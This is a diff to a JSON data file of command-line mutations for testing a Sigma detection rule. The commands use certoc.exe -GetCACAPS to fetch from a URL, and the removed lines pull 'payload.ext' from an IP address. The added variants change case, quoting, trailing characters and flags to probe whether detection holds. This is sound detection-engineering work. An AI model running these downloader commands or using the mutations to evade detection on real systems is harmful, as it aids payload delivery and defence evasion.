@@ -1,14 +1,22 @@
 [
   {
-    "output": "certoc.exe -GetCACAPS http://192.168.1.100/payload.ext",
-    "explanation": "This is the original true positive command and matches the Sigma rule's detection criteria."
+    "output": "CERTOC.EXE -GetCACAPS \"http://203.0.113.50/CertSrv/\"",
+    "explanation": "Inserted quotes around the URL to test if Sigma rule detection is affected by string formatting."
   },
   {
-    "output": "certoc.exe /GetCACAPS http://192.168.1.100/payload.ext",
-    "explanation": "Substitution of '-' with '/' for the flag is a valid mutation technique and still matches the Sigma rule."
+    "output": "certoc.exe -GetCACAPS http://203.0.113.50/CertSrv/",
+    "explanation": "Used lowercase for the executable name to test case sensitivity in detection."
   },
   {
-    "output": "certoc.exe -GetCACAPS \"http://192.168.1.100/payload.ext\"",
-    "explanation": "Insertion of quotes around the URL is a safe mutation and does not affect detection by the Sigma rule."
+    "output": "CERTOC.EXE -GetCACAPS http://203.0.113.50/CertSrv/\\",
+    "explanation": "Appended an extra backslash to test if trailing characters affect detection."
+  },
+  {
+    "output": "CERTOC.EXE -GetCACAPS http://203.0.113.50/CertSrv/ -Verify",
+    "explanation": "Added an optional flag (-Verify) to test if additional arguments affect detection."
+  },
+  {
+    "output": "CERTOC.EXE -GetCACAPS http://203.0.113.50/CertSrv/ -GetCACAPS",
+    "explanation": "Repeated the -GetCACAPS flag to test if redundancy affects detection."
   }
 ]
